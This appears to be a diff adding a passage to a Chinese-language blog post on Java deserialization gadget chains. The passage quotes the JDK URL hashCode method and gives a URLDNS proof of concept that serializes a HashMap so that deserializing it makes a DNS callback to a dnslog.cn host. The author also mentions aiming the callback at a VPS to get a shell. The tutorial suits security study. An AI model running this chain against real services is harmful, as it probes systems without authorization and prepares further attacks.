@@ -164,3 +164,105 @@ putVal接收三个参数，第一个是key值的哈希，第二个是键，第�
 <img src="https://54huarui.github.io/blogs/javaud/5.png" width="880" height="480">
 
 <br>
+
+````
+    protected int hashCode(URL u) {
+        int h = 0;
+
+        // Generate the protocol part.
+        String protocol = u.getProtocol();
+        if (protocol != null)
+            h += protocol.hashCode();
+
+        // Generate the host part.
+        InetAddress addr = getHostAddress(u);
+        if (addr != null) {
+            h += addr.hashCode();
+        } else {
+            String host = u.getHost();
+            if (host != null)
+                h += host.toLowerCase().hashCode();
+        }
+
+        // Generate the file part.
+        String file = u.getFile();
+        if (file != null)
+            h += file.hashCode();
+
+        // Generate the port part.
+        if (u.getPort() == -1)
+            h += getDefaultPort();
+        else
+            h += u.getPort();
+
+        // Generate the ref part.
+        String ref = u.getRef();
+        if (ref != null)
+            h += ref.hashCode();
+
+        return h;
+    }
+````
+
+<br>
+
+这里可以看到这个hashcode接收URL参数，然后getHostAddress方法对我们的url发送了请求，这就是链子利用的终点了
+
+在实战中似乎可以将url改成vps来弹shell，有空我就试试
+
+贴一个杭电哥们的链子poc
+
+<br>
+
+````
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.net.URL;
+import java.util.HashMap;
+ 
+public class testUrldns{
+    public static void main(String args[]) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException {
+        //通过反射创建一个URL对象
+        Class urlClass = Class.forName("java.net.URL");
+        Constructor urlCons = urlClass.getConstructor(String.class);
+        URL urlObject = (URL) urlCons.newInstance("http://vhec8z.dnslog.cn");
+ 
+        //创建HashMap对象
+        HashMap<URL,Integer> hashmap = new HashMap<>();
+ 
+        //将URL对象的hashCode值设为非-1，用于put进hashMap
+        Field hashCode_url = urlClass.getDeclaredField("hashCode");
+        hashCode_url.setAccessible(true);
+        hashCode_url.set(urlObject,114514);
+ 
+        //进行put，URL对象作为key
+        hashmap.put(urlObject,1);
+ 
+        //将hashCode值改回-1
+        hashCode_url.set(urlObject,-1);
+ 
+        //序列化HashMap对象
+        ser.serialize(hashmap);
+ 
+        //反序列化
+        uns.unserialize();
+ 
+    }
+}
+ 
+class ser {
+    public static void serialize(Object obj) throws IOException, IOException {
+        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.txt"));
+        oos.writeObject(obj);
+    }
+}
+class uns {
+    public static void unserialize() throws IOException,ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(("ser.txt")));
+        Object o = ois.readObject(); //readObject反序列化得到实例为Object类型
+    }
+}
+
+````
